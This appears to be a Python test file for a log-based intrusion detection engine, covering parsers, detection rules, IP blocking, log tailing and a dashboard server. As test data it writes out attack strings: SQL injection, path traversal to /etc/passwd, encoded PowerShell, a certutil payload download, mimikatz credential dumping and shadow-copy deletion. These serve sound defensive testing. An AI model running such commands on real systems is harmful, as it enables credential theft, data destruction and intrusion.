import http.client
import json
import os
import sys
import tempfile
import threading
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import simulator  # noqa: E402
from engine import Detector, Engine, Responder, Tailer, parse_auth, parse_process, parse_web  # noqa: E402
from server import Hub, allowed_hosts, make_server  # noqa: E402
from store import Store  # noqa: E402

TS = "2026-11-23T10:00:00"


def auth(msg, ts=TS):
    return parse_auth(f"{ts} web-01 sshd[123]: {msg}")


def web(ip, path, status=200):
    return parse_web(f'{ip} - - [{TS}] "GET {path} HTTP/1.1" {status} 512')


def proc(cmd):
    return parse_process(json.dumps({"ts": TS, "host": "WIN-01", "user": "bob", "image": "x.exe", "cmdline": cmd}))


def rule_ids(alerts):
    return [a["rule_id"] for a in alerts]


class ParserTests(unittest.TestCase):
    def test_auth_failed(self):
        ev = auth("Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2")
        self.assertEqual((ev["action"], ev["user"], ev["ip"]), ("failed", "admin", "203.0.113.9"))

    def test_web(self):
        ev = web("203.0.113.9", "/a?b=1", 404)
        self.assertEqual((ev["ip"], ev["status"], ev["path"]), ("203.0.113.9", 404, "/a?b=1"))

    def test_garbage_is_ignored(self):
        self.assertIsNone(parse_web("not a log line"))
        self.assertIsNone(parse_process("{broken json"))
        self.assertIsNone(parse_process("[1, 2]"))


class DetectionTests(unittest.TestCase):
    def setUp(self):
        self.d = Detector()

    def test_brute_force_then_compromise(self):
        out = []
        for _ in range(5):
            out += self.d.process(auth("Failed password for root from 203.0.113.9 port 1 ssh2"))
        self.assertEqual(rule_ids(out), ["AUTH-001"])
        out = self.d.process(auth("Accepted password for admin from 203.0.113.9 port 1 ssh2"))
        self.assertEqual(rule_ids(out), ["AUTH-002"])
        self.assertEqual(out[0]["severity"], "critical")

    def test_failures_outside_window_do_not_alert(self):
        out = []
        for i in range(5):
            out += self.d.process(auth("Failed password for root from 203.0.113.9 port 1 ssh2",
                                       ts=f"2026-11-23T10:{i * 2:02d}:00"))
        self.assertEqual(out, [])

    def test_normal_login_is_quiet(self):
        self.assertEqual(self.d.process(auth("Accepted publickey for alice from 10.0.0.12 port 22 ssh2")), [])

    def test_web_attacks_decoded(self):
        self.assertIn("WEB-001", rule_ids(self.d.process(web("1.2.3.4", "/p?id=1%20UNION%20SELECT%20pw"))))
        self.assertIn("WEB-002", rule_ids(self.d.process(web("1.2.3.4", "/d?f=..%2F..%2Fetc%2Fpasswd"))))
        self.assertIn("WEB-003", rule_ids(self.d.process(web("1.2.3.4", "/s?q=%253Cscript%253E"))))  # double-encoded
        self.assertEqual(self.d.process(web("1.2.3.4", "/products?id=12")), [])

    def test_directory_scan(self):
        out = []
        for i in range(15):
            out += self.d.process(web("1.2.3.4", f"/x{i}", 404))
        self.assertEqual(rule_ids(out), ["WEB-004"])

    def test_process_rules(self):
        cases = {
            "powershell.exe -NoP -enc SQBFAFgA": "PROC-001",
            "certutil.exe -urlcache -split -f http://x/p.exe": "PROC-002",
            "mimikatz.exe sekurlsa::logonpasswords": "PROC-003",
            "vssadmin.exe delete shadows /all /quiet": "PROC-004",
            "whoami /priv": "PROC-005",
        }
        for cmd, rid in cases.items():
            self.assertEqual(rule_ids(self.d.process(proc(cmd))), [rid], cmd)
        self.assertEqual(self.d.process(proc("powershell.exe -ExecutionPolicy Bypass Get-ChildItem")), [])
        self.assertEqual(self.d.process(proc("powershell.exe -ep bypass -File x.ps1")), [])

    def test_encoded_powershell_abbreviations(self):
        for cmd in ["powershell -ec SQBF", "powershell /enc SQBF", "powershell.exe -EncodedCommand SQBF",
                    "powershell -enco SQBF", "powershell -e SQBF"]:
            self.assertEqual(rule_ids(self.d.process(proc(cmd))), ["PROC-001"], cmd)

    def test_interleaved_valid_login_does_not_reset_brute_force(self):
        out = []
        for _ in range(2):
            for _ in range(3):
                out += self.d.process(auth("Failed password for root from 203.0.113.9 port 1 ssh2"))
            self.d.process(auth("Accepted password for guest from 203.0.113.9 port 1 ssh2"))
        self.assertIn("AUTH-001", rule_ids(out))

    def test_apache_timestamp(self):
        ev = parse_web('203.0.113.9 - - [23/Nov/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 5')
        self.assertEqual(ev["epoch"], 1795428000.0)


class ResponseAndEngineTests(unittest.TestCase):
    def test_responder_blocks_external_only(self):
        store = Store()
        r = Responder(store)
        ext = {"source_ip": "203.0.113.9", "severity": "high", "rule_id": "X", "title": "t"}
        self.assertIsNotNone(r.handle(ext))
        self.assertIsNone(r.handle(ext))  # already blocked
        self.assertIsNone(r.handle({**ext, "source_ip": "10.0.0.5"}))  # internal never blocked
        self.assertIsNone(r.handle({**ext, "source_ip": "198.51.100.1", "severity": "low"}))
        self.assertIsNone(r.handle({**ext, "source_ip": "not-an-ip"}))

    def test_engine_dedups_repeats(self):
        store, events = Store(), []
        eng = Engine(store, tempfile.mkdtemp(), publish=lambda k, d: events.append(k))
        for _ in range(8):
            eng.handle_event(auth("Failed password for root from 203.0.113.9 port 1 ssh2"))
        alerts = store.list_alerts()
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["count"], 4)  # alerts at failures 5,6,7,8 -> one row
        self.assertIn("block", events)

    def test_closed_alert_is_not_bumped(self):
        store = Store()
        eng = Engine(store, tempfile.mkdtemp())
        line = "Failed password for root from 203.0.113.9 port 1 ssh2"
        for _ in range(5):
            eng.handle_event(auth(line))
        store.set_status(store.list_alerts()[0]["id"], "closed")
        eng.handle_event(auth(line))  # attack continues after the analyst closed it
        alerts = store.list_alerts()
        self.assertEqual(len(alerts), 2)
        self.assertEqual(alerts[0]["status"], "open")

    def test_prune_uses_event_clock_for_replayed_logs(self):
        eng = Engine(Store(), tempfile.mkdtemp())
        for _ in range(3):  # old timestamps, as when replaying yesterday's log
            eng.handle_event(auth("Failed password for root from 203.0.113.9 port 1 ssh2"))
        eng.prune()
        for _ in range(2):
            eng.handle_event(auth("Failed password for root from 203.0.113.9 port 1 ssh2"))
        self.assertEqual([a["rule_id"] for a in eng.store.list_alerts()], ["AUTH-001"])

    def test_end_to_end_with_simulator(self):
        logs = tempfile.mkdtemp()
        store = Store()
        eng = Engine(store, logs)
        w = simulator.LogWriter(logs, reset=True)
        for name in simulator.SCENARIOS:
            simulator.SCENARIOS[name](w)
        eng.poll_once()
        fired = {a["rule_id"] for a in store.list_alerts(1000)}
        expected = {"AUTH-001", "AUTH-002", "AUTH-003", "WEB-001", "WEB-002", "WEB-003", "WEB-004",
                    "PROC-001", "PROC-002", "PROC-003", "PROC-004", "PROC-005"}
        self.assertEqual(fired, expected)


class TailerTests(unittest.TestCase):
    def test_partial_lines_and_truncation(self):
        path = os.path.join(tempfile.mkdtemp(), "a.log")
        t = Tailer(path)
        self.assertEqual(t.read_lines(), [])
        with open(path, "w") as f:
            f.write("one\ntw")
        self.assertEqual(t.read_lines(), ["one"])
        with open(path, "a") as f:
            f.write("o\n")
        self.assertEqual(t.read_lines(), ["two"])
        with open(path, "w") as f:  # truncate
            f.write("x\n")
        self.assertEqual(t.read_lines(), ["x"])


class ServerTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.store = Store()
        cls.alert = cls.store.add_alert({"ts": TS, "rule_id": "R", "title": "t", "severity": "high",
                                         "mitre": "T1", "details": "d"})
        cls.srv = make_server("127.0.0.1", 0, cls.store, Hub(), None)
        cls.port = cls.srv.server_address[1]
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()

    def req(self, method, path, body=None, headers=None):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        c.request(method, path, body=body, headers=headers or {})
        r = c.getresponse()
        data = r.read()
        c.close()
        return r.status, data

    def test_dashboard_and_api(self):
        self.assertEqual(self.req("GET", "/")[0], 200)
        status, data = self.req("GET", "/api/alerts")
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(data)[0]["rule_id"], "R")
        self.assertEqual(self.req("GET", "/api/alerts?limit=abc")[0], 400)

    def test_status_update_rules(self):
        path = f"/api/alerts/{self.alert['id']}/status"
        ok = self.req("POST", path, json.dumps({"status": "closed"}), {"Content-Type": "application/json"})
        self.assertEqual(ok[0], 200)
        self.assertEqual(self.req("POST", path, json.dumps({"status": "pwned"}),
                                  {"Content-Type": "application/json"})[0], 400)
        # text/plain = a cross-site "simple request" -> refused (CSRF protection)
        self.assertEqual(self.req("POST", path, json.dumps({"status": "open"}), {"Content-Type": "text/plain"})[0], 415)
        self.assertEqual(self.req("POST", "/api/alerts/999999/status", json.dumps({"status": "open"}),
                                  {"Content-Type": "application/json"})[0], 404)

    def test_foreign_host_header_rejected(self):
        self.assertEqual(self.req("GET", "/api/alerts", headers={"Host": "evil.example"})[0], 403)

    def test_wildcard_bind_accepts_own_hostname(self):
        import socket
        self.assertIn(socket.gethostname().lower(), allowed_hosts("0.0.0.0"))
        self.assertNotIn("evil.example", allowed_hosts("0.0.0.0"))


if __name__ == "__main__":
    unittest.main()
